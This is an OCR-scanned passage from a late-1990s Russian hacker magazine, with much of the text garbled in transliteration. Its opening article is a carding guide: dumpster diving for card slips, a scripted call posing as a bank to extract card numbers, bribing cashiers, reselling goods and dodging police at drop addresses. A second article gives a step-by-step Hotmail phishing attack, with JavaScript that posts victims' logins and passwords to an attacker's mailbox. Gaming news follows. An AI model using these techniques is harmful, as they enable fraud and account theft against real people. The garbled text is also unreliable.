информации. После того как они выкинули 
весь хлам из магазина, быстро иди и заби- 
рай его. Никто не гарантирует, что ты там 
найдешь хотя бы один номер карты, но, с 
другой стороны, есть очень большая вероят- 
ность, что в бумагах будет много полезной 
информации. А если тебе повезет, то — и 
слипы от карточек или отчетности бухгалте- 
ра по принятым карточкам, который допус- 
тил ошибку и выкинул документ/ не рвя его 
на мелкие кусочки. Я знаю, копаться в мусо- 
ре — дело не царское. Зато, если удача ока- 
жется на твоей стороне, то ты будешь щед- 
ро вознагражден. Зачем же придумывают 
всякие варварские уничтожители докумен- 
тов? Да в любом агентстве, консультирую- 
щем по вопросам безопасности, тебе ска- 
жут, что мусор — самый простой способ уз- 
нать чужие тайны. 




Ты слишком горд, чтобы копаться в му- 
соре? ОК, тогда для тебя способ №2. 
Используй психологию! Очень часто, 
когда какому-нибудь владельцу кредит- 
ной карты звонят из банка, сообщая об 
ошибке в базе данных с его картой, это 
оказывается вовсе не банковский ра- 
ботник, а хакер Вася. 

Запомни, в мире существует 4 страсти, 
ради которых люди теряют голову: секс, 
власть, деньги и любовь. В кардинге 
обычно используют страсть к деньгам. 
Итак, каждый человек трясется за свои 
денежки, особенно за крупные суммы. 
Система проста, как все гениальное. 
Звонят какому-нибудь перцу, и с ним по- 
лучается вот такой диалог. 

Ты: Добрый день. Это Иванов Иван? 

Он: Да. 

Ты: Вас беспокоит Фрик Хакович Хаке- 
ридзе из кредитно-кассового отдела 
банка «Национальный Кредит». Через 



Но, возможно, что ты не только боишь- 
ся замарать свои ручонки, но и совер- 
шенно не умеешь разговаривать по те- 
лефону. Ну, не научила тебя мама, ну 
что ж поделать? Остается одно — при- 
менить способ №3. 

Многие пытаются найти какую-нибудь 
подругу, которая работает в супермар- 
кете или магазине, принимающем кре- 
дитные карточки. Когда карточка про- 
ходит через кассира, то ее прокаты- 
вают в специальной машинке, и выдает- 
ся 2 слипа (чека с информацией о карте 
и покупке). Первый слип отдается 
клиенту, а второй остается в магазине и 
потом направляется в банк, чтобы тот 
его оплатил. Кардер пытается догово- 
рится с кассиром, чтобы он давал номе- 
ра карточек со слипов. Но, за 98 год, 
УЭП, занимающийся кардерами, за- 
держал более 40 кассиров, именно за 
такие операции. Поэтому сейчас, такую 



То есть, если заказ не превышает эту сум- 
му, то банк АВТОМАТИЧЕСКИ считает, 
что такая сумма есть на карте, и в случае, 
если ее там не окажется, банк сам пок- 
роет расходы. Поэтому система проверки 
заказов, не превышающих эту сумму, уп- 
рощена. Я понимаю, что ты сразу же захо- 
чешь заказать 20-Гигабайтный винт или 
что-то в этом роде, но вот этого-то делать 
и не стоит. Павел Шейко, например, тоже 
заказывал себе кучу компьютерных при- 
мочек, а теперь мотает свои 5 лет. 

Где заказывать? Ну, конечно же, в Интер- 
нете! Найди какой-нибудь сервер, кото- 
рый обслуживает кредитные карты. Поста- 
райся найти не самый популярный сервер. 
Например, на «ВиуЭігесІ» у тебя такие ве- 
щи не пройдут. А вот какая-нибудь не 
очень распространенная звукозаписы- 
вающая компания, обещающая быструю 
доставку, с удовольствием продаст тебе 




аѵ 



ГТ 

получение кредитной карты 



нас прошел счет, в котором говорится, 
что вы в один день совершили покупку 
по кредитной карте на сумму 8000$. 
Нам нужно ваше подтверждение на та- 
кую крупную сумму операции. 

Он: Да вы с ума сошли??? Я не покупал 
ничего на 8000 баксов! 

Ты: Понятно. Значит, либо мы ошиб- 
лись, либо кто-то незаконно использует 
вашу карточку. Вы точно не делали та- 
кой покупки 1 января? 

Он: Да я уже сказал, нет! Это какая-то 
ошибка!!! 

Ты: Хорошо. Мы сейчас проверим. Про- 
диктуйте, пожалуйста, номер вашей 
карты. 

Он: 1234567890123456. 

Ты: И дату окончания действия. 

Он: Ноябрь 99. 

Ты: Спасибо. Мы проверим. Пожалуй- 
ста, не делайте никаких покупок по этой 
карте в течение сегодняшнего дня. 

Он: Хорошо. Большое спасибо. Когда 
выясните, перезвоните мне, пожалуй- 
ста. 

Ты: Конечно. До свидания. Извините за 
беспокойство. 

Вот тут есть некоторые тонкости. Во- 
первых, если тебе 1 2 лет, то и не стоит 
этим заниматься. Тебя просекут сразу 
же! Лучше попроси своего старшего 
брата или приятеля. Во-вторых, воз- 
можно, этот человек не такой уж лох, 
как ты думаешь. Он может спросить но- 
мер твоего телефона, чтобы самому те- 
бе перезвонить, проверив тем самым, 
действительно ли ему звонят из банка. 



лохушку найти будет очень тяжело. 

ОК. Карта у тебя есть. Имя на карте и 
дату окончания действия ты знаешь. Что 
делать дальше? Дальше начинается 
следующий процесс работы, и это еще 
не сладостный миг удачи. Можно нака- 
чать себе из Интернета кучу платного 
софта. Это если ты не знаешь, что та- 
кое «Горбушка», и у тебя супер-пупер 
скорость подключения. Можно с по- 



парочку музыкальных СО. Никогда не за- 
казывай в России! У нас, к сожалению, 
еще не так сильно распространена систе- 
ма оплаты кредитками, зато хаканье кре- 
диток является народным творчеством, и 
поэтому к каждой покупке по кредитке от- 
носятся слишком серьезно. Есть большая 
вероятность, что перед тем, как тебе что- 
то отправят, номер кредитки проверят сто 
раз, да еще и дождутся, когда банк пере- 



сущ 



еет/ует 4 сгряЬ'Ш, 



мощью этой кар- р 

точки открыть себе • О 
доступы на порно- \ ' ** \ I . " 

серверах. Это для 7І 'Ю/ІООЧ' 

тех, у кого подруж- * п ' * 

ка — компьютер. Секс., 6лаоі% , іемги « МоьоМ* 

Если тебе и в жизни ^ ^ ч 

секса хватает, то^5 ^ деле Мет дуёеМ 

“ доч ° - “ ваП -м ^ пои*. ) . 



тащить из карты 
как можно больше 
наличных. Делается это так: ты заказы- 
ваешь какой-нибудь товар, получаешь 
его и сразу же продаешь. Никогда не 
оставляй себе никакой товар. Этим ты 
только упростишь работу милиции, ког- 
да они придут к тебе знакомиться. Ког- 
да хозяину карточки придет счет, он 
позвонит в банк и скажет, что не делал 
такого заказа. После всех разборок 
карточку заблокируют. Но! Не думай, 
что они просто убьют счет. Они будут 
отслеживать попытки заказов по забло- 
кированной карте. Еще один совет: кре- 
дитная карта называется «кредитной» 
потому, что для нее есть некоторая сум- 
ма, которой банк безоговорочно верит. 



ведет им сумму твоего заказа. В Штатах и 
других буржуйских странах все намного 
проще. Чаще всего там дорожат своей ре- 
путацией, а так как скорость обслужива- 
ния клиентов — одна из главных характе- 
ристик хорошей компании, то там отправ- 
ляют заказ сразу же, проверив только, су- 
ществует ли такая карта в природе и есть 
ли на ней такая сумма. 

А вот теперь начинается самая трудная 
часть. На какой адрес заказывать? Мо- 
жешь заказать на свой. Тогда, открыв по- 
сылку, вместо своего заказа ты там уви- 
дишь десять ОМОНовцев, 
которые почти друже- ^ 
любно предложат тебе А А 





примерить но- 
вую модель модных браслетов. 

Совет №1: Когда ты будешь проверять 



почтовый ящик, всегда сначала обойди 
вокруг и присмотрись, не наблюдает ли 
кто-то со стороны. Если ты заметишь, 
что за тобой следят, ни в коем случае 
НЕ БЕГИ!!! Это распространенная 
ошибка. Просто пройди мимо спокой- 
ной походкой и никогда больше туда не 
возвращайся. 

Совет №2: Когда ты заберешь квитан- 
цію или товар, возвращайся домой 
окольными путями. Пусть ты доберешь- 
ся до дома за 4 часа, а не за 20 минут, 
зато ты узнаешь, следят за тобой или 
нет. 

Совет №3: Когда будешь получать то- 
вар у человека или приятеля, не говори 
с ним о заказе вообще. И ОБЯЗАТЕЛЬ- 
НО расплатись с ним сразу же! Разго- 
вор должен быть таким: «Принёс?» — 
«Да. Держи» — «ОК. Вот тебе столько- 
то баксов. Спасибо. Пока». Разворачи- 
вайся и уходи. Никакого обсуждения то- 
го, как и откуда ты ее заказал, быть не 
должно. 

Совет №4: Если тебя схватили за руку, 
когда ты получал товар от друга или че- 
ловека, не паникуй! Если во время пере- 
дачи посылки ты придерживался преды- 
дущего совета, то можешь запросто 
сказать, что ты это у него покупал и не 
понимаешь, в чем здесь криминал? 

А для тех из вас, кто не собирается зака- 
зывать ничего ощутимого, и единствен- 
ное, что ему нужно — это подсадить свой 
модемчик загрузкой лицензионного соф- 
та или надпись «ѴѴеІсоте, тетЬег!» на 
порносервере, раздел о генерации но- 
меров карточек. Давай-ка для начала 
поймем саму кредитку. Что она в себе 
скрывает? Итак, номер кредитной карты 
обычно состоит из 1 6 цифр, хотя сущес- 
твуют карты и с 13-ю цифрами. Первая 
цифра определяет, к какому типу отно- 
сится карта: 5 — МазіегСагсІ, 4 — ѴІ5А, 
3 — Атегісап Ехргезэ. Следующие 3 
цифры определяют, к какому банку отно- 
сится карта. Далее следуют цифры, 
идентифицирующие саму карту, и пос- 
ледняя цифра является контрольной. 

Контрольная цифра — 
это результат опреде- 
ленных математических 



операций со всеми предыдущими цифра- 
ми. Таким образом проверяется, дей- 
ствительно ли это номер кредитки или 
просто набор цифр «от балды». Вот этим 
то алгоритмом и 
пользуются кардге- 
нераторы — спе- 
циальные програм- 
мки, готовые по пер- 
вому твоему требо- 
ванию выдать ог- 
ромный список но- 
меров, принадлежа- 
щих заданному то- 
бой банку. Но вот 
только имя на карте 
и дату окончания действия карты эти 
программки узнать-то не могут! И если 
еще года 3-4 назад одного только номе- 
ра было достаточно, то теперь любой 
системе проверки карт потребуется вся 
информация. Компьютеры совершен- 
ствуются. Раньше они проверяли только 
номер, сверяя контрольную цифру, а те- 
перь подключаются к базе данных на 
\ѵ\ѵѵ/.800.сот, где сверяют и имя, и дату 
окончания действия. :( Хотя, говорят, в 
Сети еще остались серверы, на которых 
стоят старые системы проверки, и там 
можно зарегистрироваться, введя абсо- 
лютно левое имя и любую дату. Боль- 
шинство обычных пользователей Сети 
получает номер кредитки как раз от 
кард-генераторов. Правда, потом они 



Статья 159. МОШЕННИЧЕСТВО. 

1 . Мошенничество, то есть хищение чу- 
жого имущества или приобретение 
права на чужое имущество путем об- 
мана или злоупотребления дове- 
рием, — наказывается штрафом в раз- 
мере от двухсот до семисот минималь- 
ных размеров оплаты труда или в раз- 
мере заработной платы или иного до- 
хода осужденного за период от двух до 
семи месяцев, либо обязательными ра- 
ботами на срок от ста восьмидесяти до 
двухсот сорока часов, либо исправи- 
тельными работами на срок от одного 
года до двух лет, либо арестом на срок 
от четырех до шести месяцев, либо ли- 
шением свободы на срок до трех лет. 

2. Мошенничество, совершенное: 

а) группой лиц по предварительному 
сговору; 

б) неоднократно; 

в) лицом с использованием своего слу- 
жебного положения; 



полдня ищут сервер, который пропустит 
эту лажу. Но если ты захочешь пользо- 
ваться сгенерированным кодом, то не 
забудь, что большинство этих програм- 
мок написано на ѴізііаІ Вазіс, а поэтому, 
если у тебя не 98-й ѴѴіпсіоѵѵз, то тебе 
необходимо будет качнуть библиотечки: 

ѴВ40032.РІІ, М5ѴВѴМ50.ЭІ1, 

ѴВР11Ы30(ШІ±. 

Счастливого хакинга! 

Р.5.: Да, чуть не забыл! 
Предупреждение! Занимаясь хакер- 
ством, ты нарушаешь закон. На самом 
деле, всё не так уж просто, как кажется. 
Я раньше тоже думал, что в нашей стра- 
не кардингом можно заниматься спокой- 
но, но когда мы пытались встретиться в 
тюрьме с Гофманом (сидит в СИЗО), нам 
пришлось столкнуться с УЭПовцами. По- 
верь мне, приятель, это далеко не лохи. Я 
вкорне переменил своё мнение о них, 
когда столкнулся с ними лицом к лицу. 
Это профессиональные ребята, и у них 
есть специальная группа, которая зани- 
мается кардерами. К сожелению, зани- 
маются они этом очень успешно. В 98 го- 
ду они взяли несколько кардерских групп 
и более 40 человек. А это ведь, только 
Москва! Вообщем, подумай трижды, 
прежде чем заняться кардингом. 



г) с причинением значительного ущер- 
ба гражданину, — 

наказывается штрафом в размере от 
семисот до одной тысячи минимальных 
размеров оплаты труда или в размере 
заработной платы или иного дохода 
осужденного за период от семи меся- 
цев до одного года либо лишением 
свободы на срок от двух до шести лет 
со штрафом в размере до пятидесяти 
минимальных размеров оплаты труда 
или в размере заработной платы или 
иного дохода осужденного за период 
до одного месяца либо без такового. 

3. Мошенничество, совершенное: 

а) организованной группой; 

б) в крупном размере; 

в) лицом, ранее два или более раза су- 
димым за хищение либо вымогатель- 
ство, — 

наказывается лишением свободы на 
срок от пяти до десяти лет с конфиска- 
цией имущества или без таковой. 



Мі Какой адрес 
7о$* р ? МѵЖешС 
сбои. Тогда, оТкрѵ/ Нос*мку> 
іиесто сбое го заказа т$/ 







Недавно была найдена очень серьезная дырка у известной почто- 
вой компании НоітаіІ (ѵмѵѵѵѵ.ЬоітаіІ.сот), которая легко позволяет уз- 
нать логин и пароль юзера. Дырка заключается в посылке сообщения 
со вставленным іаѵазсгірі кодом. 

Когда пользователь попытается прочитать письмо, код автомати- 
чески перезайдет на ту же страницу и отошлет логин и пароль пользо- 
вателя на указанный в коде Е-МаіІ . 

Когда ты узнаешь логин и пароль юзера, то сможешь полностью 
управлять взломанным акаунтом: 

— Посылать и читать почту. 

— Проверять почту на других почтовых серверах, которые были зане- 
сены в настройках. 

— Получить доступ к книге адресатов (Асігезз Воок). 

Получать различные пароли от сайтов, которые жертва будет ре- 
гистрировать на эту мыльницу. 

— Менять пароль у этого акаунта. 

ІюасІіпд... 

Итак, как ты уже, наверно, догадался, для того чтобы завладеть чужим 
ящиком, надо всего лишь вставить |аѵа код в свое письмо, используя 
стандартные программы, такие как Ыеізсаре МаіІ, Мз ОыіІоок Ехргезз 
или обычный Іпіегпеі МаіІ. 

Очень приятная дырочка, так как: 

1 . Код запускается сразу после открытия письма. 

2. Код не требует больших компьютерных ресурсов. 

3. Зараженное письмо можно послать откуда душа пожелает: Интер- 
нет кафе, школа, институт и т. д. 

4. Дырка будет работать с любым браузером, поддерживающим 
Іаѵазсгірі, включая Місгозой Іпіегпе* Ехріогег и Ыеізсаре 
Сотггшпісаіог. 

Итак, что тебе для этого понадобится: 

— Компьютер, подключенный к Интернет. 

— Почтовый клиент. 

— Текстовый редактор (ІЧоіерасІ). 

І-еѵеІ 1: 

Заходим на другую почтовую компанию ѵѵѵ/ѵѵ.деозіііез.сот. Выби- 
раем имя пользователя «уЬѵ/с» для примера. Регистрируемся в систе- 
ме и получаем новый почтовый ящик уЬѵ/с@деосіііез.сот. 

І-еѵеІ 2: 

Открываем текстовый редактор и пишем в нем Іаѵазсгірі код. Сох- 
раняем всю эту бодягу как теззаде.Ніт. Строка 1 7 содержит твое имя 
пользователя (уЬѵѵс), смотри шаг 1 . А вот и сам код: 

<НітІ><НеасІ></НеасІ><ЬосІу> 

<р>»Оо хѵНеге уосі ѵ/апі іовау» - ВІііе А6ері</р> 

<зсгірі> 

ѣпсііоп деіте$$0{ 

геіигп «<іаЫе ЬогНег=0 сеІІраМпд=5 сеІІзрасіпд=5 ѵ/іМ=508 
НеідНі=90%>» + 

« <іг ѵаІідп=тісПІе>» + 

«<іН соІзрап-2>» + 

«<іопі іасе^^АгіаІ, НеІѵеііса\» $іге=\»5\»>» + 

«У/е'ге Зоггу, У/е СаппоКЬг>Ргосез5 Уоиг Редиезі» + 

«</ Ьпі></іЬ></іг>» + 

«<іг ѵаІідп—тісІсИе><ісІ аіідп =сепіег>» + 

«<*оШ Іасе=\»АгіаІ, НеІѵеііса\» зяе~\»3\»>Кеазоп:&пЬзр;</ЬпГ> » + 
«<іопі і Ъсе=\»АгіаІ / НеІѵеііса\» зііе=\»3\» 
соІог=\»#НОООО\»><Ь>Тіте ехрігесі. РІеазе ге- 
Іодіп. </Ь></ЬпГ><Ьг>» + 

«<іопі I асе=\»Агіа ! , НеІѵеііса\ » зі2е=\»2\»><а 
Нге^= \ »Ніір:// илѵѵѵ. НоітаіІ. сот/ еггогтзд. НітІ\»>(Сеі тоге іпіо 
гедагбіпд еггог теззадез Неге)</а></Ьпі>» + 



«</ісі></іг>» + 

«<іг ѵаІідп=\»тШІе\»><Г<3 а!ідп=\»сепіег\»>» + 

«<РОШ МЕТНСЮ=Р05Т 
А СП ОЛ/= \ »Ніір://\ѵѵлѵ. деосіііез. сот/сді- 
Ьіп/НотезіеасІ/таіІ.рІ?уЬ\ѵс\» 
іагдеі= \ »_ іор \ »>» + 

«<ІЫРІ)Т ТУРЕ=\»НМеп\» ЫАМЕ= \ »пехі-игІ\ » 

ѴАШЕ= \ »Ніір:// НоітаіІ. сот \»>» + 

«<ІІЧРІІТ ТУРЕ=\»НШеп\» МАМЕ=\»зиЬіесі\» ѴАШЕ=\»Ноітаі! 
Разз\ѵогсІ\»>» + 

«<іаЫе сеІІрас!сІіпд= \»0\» сеІІзрасіпд=\»5\» ЬогсІѳг^^О^Х + 
«<іг>< 1 в><{оп 1 іасе=\»АгіаІ \ НеІѵеііса\» зі 2 е=\» 2 \»Нодіп 
Мате:</{опі><Ьг><іпрііі іуре—\»іехі\» пате^^Іодіп^ зі 2 е а \» 16\» 
тахІепдіН=\» 1 6\»></іс!><ів><Ьпі {асе=\»АгіаІ у Не!ѵеііса\» 

8 І 2 е=\ »2 \ »>Разз\ѵог&</ (опі> <Ьг><іпрЫ іуре= \ »раззѵ/огс! \ » 
пате=\ »раззѵ/сі\» зІ 2 е=\» 16 \» тахІепдіН—\» 1 6 \»>&пЬзр;<іприі 
іуре=\»зиЬтіі\» ѵаІие=\»Епіег\»></ісІ><іг>» + 
«</іаЫе></іогт></ісІ></іг>» + 

«<іг ѵаіідп =тісІсіІе><іЬ соІзрап =2 аІідп=сепіег>» + 

«<іопі {асе=\»АгіаІ, НеІѵеііса\» зі 2 е=\» 3 \»>» + 

«Реіи г п іо <а Нг еН= \ »ННр://\ѵеІсоте. іо/\ѵѵ/\ѵ. НоітаіІ. сот \ » 
іагдеі= \ »_рагепі\»>НоітаіГз Нотераде</а>.» + 
«</Ьпі></іНх/іг></іаЫе>» + 

«<рхі т д згс=\»ННр://209. 1. 1 12.251/с9698.діГ\» ѵ/М=189 
НеідНі=І 6 

Ьог 6 ег =0 аІі=\»СорупдЫ / 998- 1 999\»>»; 

} 



поѵ/огкІіпкзЧор. ѵ/огк. сіоаітепі. Ііпкз. ІепдіН; 

Ьг(і=0;і<поѵ/огкІіпк5- 1;І++){ 

іор. ѵ/огк. (Зоситепі. Ііпкз[ ]. іагдѳі^ѵ/огк»; 

іор. ѵ/огк. сіоштепі. Ііпкз[і]. Ьге(=»іаѵазспрі:деіте5з0»; 

</зсгірі> 

</Ьо6у> 

</НітІ> 

І-еѵеІ 3: 

Создаем новое письмо, пишем что угодно, типа: «Здравствуй, ма- 
лыш. Поздравляю тебя с всемирным днем борьбы с хакерством. Вечно 
твоя тетя Хака.», вставляем файл теззаде.Ніт в письмо и отсылаем на 
ящик жертвы, к примеру, Іатег@ЬоітаіІ.сот. 

І-еѵеІ 4: 

Ждем, когда жертва прочтет это письмо, постоянно проверяя наш 
ящик на ѵллѵѵ/.деозіііез.сот. Если ты не облажался и все сделал вер- 
но, то получишь письмо, в котором будут: ІР адрес жертвы, имя поль- 
зователя на Хотмайле и, конечно же, драгоценный парольчик ... 

Сате Оѵег. 

Ой, ой, ой, брателло, чуть не забыл о защите тебя самого. :) 

Чтобы защитить себя от этой дырки, нужно перед заходом на 
НоіМАИ всего лишь отключить в настройках своего браузера поддер- 
жку іаѵазсгірі, |аѵа, картинок, видео, цветов и текста. :) 



Р.5. Возможно , к выходу номера в печать 
МісгозоЕ НоіМАИ уже запатчит эту дырку... 




потепиІіпкзЧор.зі/Ьтепи.сіоситепі.Ііпкз. ІепдіН; 
іог(і=0;і<потепи1іпкз- 1;і++){ 
іор.зиЬтепи. сІосі/тепі.ІІпкз[і]. іагдеі°»\ѵогк»; 
іор.зиЬтепи.сІоситепі.Ііпкз[і].НгеН я »іаѵазсгірі:деіте580»; 




не появился Оотіліоп I / # ^ 

5іогт. Стратегия ока- | 
залась очень второе- V А 

тепенной - благодаря « 

широкой рекламной 

кампании она отлично продалась, но при 
этом заслужила самые нелестные отзывы 
многих игроков и подорвала доверие к 
Іоп Зіогт (в первую очередь - доверие 
Еісіоз - все прочее уже не столь важно). 
Потом стало известно, что в 
Эорреідапдег еще и конь не валялся, что 
АпасЬгопох как раз переполз на новый 



движок, а Оаікакзпа 
выйдет никак не в 
сентябре девяносто 
восьмого, как обеща- 

лось, а в... ну, соб- 
ственно, он еще и не вышел. Далее, с се- 
редины осени, Іоп 5іогт вошел в полосу 
кадровых перестановок: из него один за 
другим уходили программисты, менедже- 
ры, художники. Злые языки чесали, что 
крысы бегут с тонущего корабля, а Роме- 
ро между тем купался в лучах славы: 
охотно раздавал интервью направо и на 
лево, втихомолку иногда подмечая, что 
«Оаікаіапа уже готов, просто Еісіоз его в 
продажу пока не пускают, придержи- 



(Скандал вокруг Іоп 5»оггп) 



Оаікаіапа (Іоп Зіогт) 



Х:/пе>73/дашез 



шению реалтаймовую стратегию 
йотіпіоп и примерно в тот же период 
заключили договор с Еісіоз Іпіегасііѵе об 
издании всех своих продуктов. Затем ио- 
новцы стартовали разработку еще одной 
игры - ролевого Оец$ Ех. 

Будущее ионовцев казалось радуж- 
ным, пока в первой половине того года 



вают». Над Іоп 5іогт сгущались грозовые 
тучи. 

Такова прелюдия. И теперь настал 
черед обратиться к январской статье в 
газете «Эаііаз ОЬзегѵег» за авторством 
некой Кристин Бидерман. В той статье, 
помимо многого прочего, содержались 
реальные фрагменты из электронной пе- 
реписки между сотрудниками Іоп $іогт. В 
этих письмах обсуждалось предложение 
компании Еісіоз о покупке ею 19% акций 
Іоп Зіогт за 1 2.5 миллиона баксов. И не 
только это. Как выясняется из писем, ио- 
новцы мечтали бы о заключении подоб- 
ного соглашения (да и любой бы на их 
месте мечтал - это выгодно), но Еісіоз 

прежде того хотели 
знать несколько ве- 
Д щей. А именно: в 
каком состоянии 
находится разра- 
ботка Эаікаіапа, 
АпасЬгопох и Эеыз 
Ех, а также с чем 
связано то, что Ро- 
меро почти не за- 
нимается 
Эаікаіап'ой, а 
вместо этого черт 
знает чем зани- 
мается. Ионовцы бы- 
ли готовы оправдаться по всем пунктам, 
кроме одного: с Оаікаіапа, да и с рабо- 
чим рвением Ромеро было далеко не все 
в порядке... Вряд ли стоит говорить, что 
обнародование этих писем привело к то- 
му, что их прочли большие боссы из 
Еісіоз, и тогда Іоп Зіогт оказался по уши 
в дерьме. 

Семнадцатого января компания Іоп 
$к>гт подала в суд на газету «ЭаІІаз 
ОЬзегѵег». Причем причиной подачи 
заявки послужило не желание отомстить 
(оно и понятно - тут уж не до мести, тут 
шкуру спасать надобно), а намерение 
любой ценой выяснить, каким образом 

(читай: от кого) удалось 
журналистке Крис- 
тин Бидерман полу- 
чить эти письма. На 
данный момент си- 
туация такова, что 
адвокаты журнала 
пытаются не дать 
делу хода. 

А тем време- 
нем боссы из Еісіоз 
направили своих 
людей на Іоп Зіогт 
для выяснения, в ка- 
ком состоянии пре- 
бывают дела. Еще бы. Ведь в разработку 
игр уже вложено немало эйдосовских де- 
нег. Одна только реклама грядущего 
Оаікаіапа, по некоторым источникам, 
стоила им уже больше 250 тысяч зеленых. 
Очевидно, что за такие деньги смертоси- 
мулянт Ромеро может погибнуть в третий 
раз, только теперь уже по-настоящему 
(см. предыдущее новостное сообщение). 

Еще один факт вам в баксовую копил- 
ку. Для того чтобы окупиться, Оаікаіапа 



(Ромеро снова окочурился 



На сей раз Ромеро лишился жизни в 
трагической авиакатастрофе. Совершен- 
но верно, именно Джон Ромеро, а не ка- 
кой-нибудь там елкин-палкин из белой из- 
бушки. Летел на вертолете и, понимаешь 
ли, навернулся о землю с фатальным ис- 
ходом. Это переполошившее всю игро- 
вую общественность событие произошло 
в Штатах. Точнее — в штате Колорадо. 

А вскоре другому Джону Ромеро, чье 
имя неразрывно ассоциируется с трех- 
словием ЭООМ-Оііаке-Ьаікаіапа, приш- 
лось всем доказывать, что «Гт поі беас!», 
а разбился его одноименец-однофами- 
лец. Большой прикол состоит в том, что 
Ромеро околевает уже во второй раз - 
впервые это случилось в конце лета того 
года, когда опять же погиб его одноимен- 
нофамилец, а наш с вами Ромеро дал се- 
бя сфотографировать заместо усопшего, 
причем еще и с искусственным пулевым 
отверстием во лбу. 

«Я боюсь до мозга костей, - жалуется 
Джон Ромеро из Іоп Зіогт. - Я боюсь, что 
в будущем, лет через двадцать, рассер- 
женный издатель моего Іоп ЗіоптГа извле- 
чет АІ из Эаікаіапа, имплантирует его в 
мозг киборга и пошлет того назад во 
времени, чтобы убить меня. Но в мире ес- 
ть другие люди, которых тоже зовут Джон 
Ромеро, и киборгу понадобится время, 
чтобы методом проб и ошибок добраться 
до того, который ему нужен. До меня». 

Звучит устрашающе, не так ли? Но 
успокойтесь, дорогие поклонники и пок- 
лонницы великого дважды трупа. Злой ки- 
борг еще не скоро доберется до Джона, 
так как в одних лишь Штатах этих джон 
ромер хоть пруд пруди да неводом вы- 
лавливай. А если серьезно, то в шуточных 
словах Ромеро прозвучал нешуточный 
наезд на Еісіоз Іпіегасііѵе, которые сейчас 
как раз и являются издателями Іоп Зіогпл. 

В настоящее время между ними полном 
:>дом идет свара на почве того, что Ро- 
меро никак свою йаікаіап'у не закончит. 
Может, он и вправду ее не раньше, чем 
лет через двадцать решил выпустить? 

Касательно конфликта читайте наш 
дальнейший репортаж. 



Господа, вот уже несколько лет в иг- 
ровом мире не было ничего подобного 
тому скандалу, который разразился сей- 
час вокруг Іоп Зіогт. Начну с прелюдии. 

После ухода из ісі Зойѵѵаге Джон Ро- 
меро вместе с двумя сотоварищами об- 
разовал компанию Іоп Зіогт, вскоре 
анонсировавшую сразу три проекта: 
Оаікаіапа (30 асііоп), АпасЬгопох (30 
РРѲ) и Эорреідапдег (пока никто так и не 
понял). Позже, вместе с уходом компании 
7іЬ 1_еѵе1 из игрового бизнеса, іоп Зіогт 
перекупила у нее близившуюся к завер- 



028 



по выходу должна была быть продана ти- 
ражом не менее двух с половиной мил- 
лионов копий. Для справки: второй 
Оіюке продался меньшим тиражом, а 
Оаікаіапа вряд ли имеет хоть какие-ни- 
будь шансы обскакать его по популяр- 
ности. Онлайновый журнал «Сате Оаііу» 
выяснил мнение Ромеро по этому поводу. 
«Мы строим далеко идущие финансовые 
планы, как и любая коммерческая компа- 
ния, - лаконично вещает всенародный 
любимец, - Именно по этой причине мы 
ведем сейчас сразу три игры (Оаікаіапа, 
АпасНгопох и Оеыз Ех), да и к тому же - в 
начале пути всегда приходится ехать по 
рытвинам и ухабам». 

В день, когда Ромеро давал это ин- 
тервью, из Іоп Зіогт был уволен Стив 
Питтсенбаргер, прежде находившийся на 
одной из важных административных дол- 
жностей. Прежде того была расторгнута 
и забыта намечавшаяся сделка по покуп- 
ке акций Іоп $іогт. Сейчас, хотя это и не 
афишируется, под большим вопросом на- 
ходится то, собирается ли Еісіоз продол- 
жать финансировать Іоп Зіогт. 

И многое другое еще остается под 
вопросом. Вполне возможно, что в сле- 
дующем номере «Хакера» мы с вами вер- 
немся к этой теме и посмотрим, чем там 
все закончится. 

("таятся**) 



лись Зіегга Зрогіз, пустив в печать спор- 
тивный симулятор по регби ЫРІ. РооіЬаІІ 
Рго '99, который вообще ни с какого бо- 
ка работающим не являлся. Причем выяс- 
нилось это, по неумолимому закону под- 
лости, не раньше, чем игра уже поступи- 
ла в продажу. 

Теперь злосчастный американский 
футбол повсеместно изымают из магази- 
нов. Зіегга клянется, что всем покупате- 
лям вернут деньги, от цента до копейки. 
Оно и понятно - а то ведь их, голубчиков, 
по судам затаскают, это вам не россий- 
ское закономздательное дикообразие. 

«Я хочу извиниться перед нашими пот- 
ребителями за выпуск незавершенного 
продукта, - самолично оправдывается 
сьерровский президент Дэвид Гненевет- 
цки. - Мы слишком рано пустили игру на 
прилавки. Теперь мы переделаем ее с ну- 
ля, и в августе выйдет ЫРІ. РооіЬаІІ Рго 
2000, благодаря которому наши поклон- 
ники воочию убедятся, насколько велик 
был потенциал, заложенный в эту нашу 
разработку». 

Обелился, в общем, пан Гненеветцки 
и даже игру умудрился по ходу дела лиш- 
ний раз прорекламировать. И еще много 
чего такого наговорил, что прямо-таки 
очищенным ангелом представился. А тем 
временем, по конфиденциальным источ- 
никам, в Зіегга Зрогіз уже уволен менед- 
жер продаж и еще кто-то из администра- 
тивного персонала. За недосмотр и ха- 
латность. И это правильно. 




ЗТагсгаЙ- — номер один 



Однако, господа хорошие, од- 
нако. Уже прочли нашу статью по пат- 
чам? Если прочли, то должны иметь себе 
в виду, что сейчас в буржуазных игровых 
кругах складывается тенден- 
ция к выпуску недозакон- 
ченных игр, впоследствии 
снабжаемых патчами, 
подлежащим скачке через 
И-нет. И, должно быть, эта 
тенденция начинает захо- 
дить слишком далеко и да- 
же еще дальше, так как, 
вдохновившись возмож- 
ностью выпуска недоде- 
ланных продуктов, для ко- 
торых потом можно от- 
дельно доделки издавать, 
некоторые конторы нача- 
ли зарываться и выпускать 
вообще неработающие 
игры. На означенном поп- 
рище, как никогда, отличи- 



Как сообщают официальные источни- 
ки, по итогам истекшего года самой про- 
даваемой в мире игрой была ЗіагсгаН. 
Игра продалась в количестве более чем 
полутора миллионов копий. Таким обра- 
зом, ЗіагсгаЙ сделалась уже третьей иг- 
рой на счету ВІіггагсІ, чьи продажи пере- 
валили миллионный рубеж. 

Хорошо, что хоть не позорный Реег 
Ныпіег на первом месте - он уже давно 
ошивается в первой тройке. Зіагсгаіі - это 
еще куда ни шло. 






-с ^ 


































( Накорми голодного ) 



Скажите, пожалуйста, а как часто вы 
подаете ободранным нищим, бомжам 
бездомным и прочим бесхозно шатаю- 
щимся личностям, выпрашивающим у 
прохожих деньгу на пропитание и прочие 
душеобщипательные надобности? Если 
вы настолько богаты или сердобольны, 
что иногда все же подаете, то от этой но- 
вости вы будете без ума. Вы будете пры- 
гать от счастья и кидаться на окружаю- 
щих с лозунгом «помоги голодному!» на 
устах. 

Они называют себя «Ѳатегз АІІіеб 
Адаіпгі Нітдег», что в буквальном (да и в 
любом другом) переводе означает «Гей- 
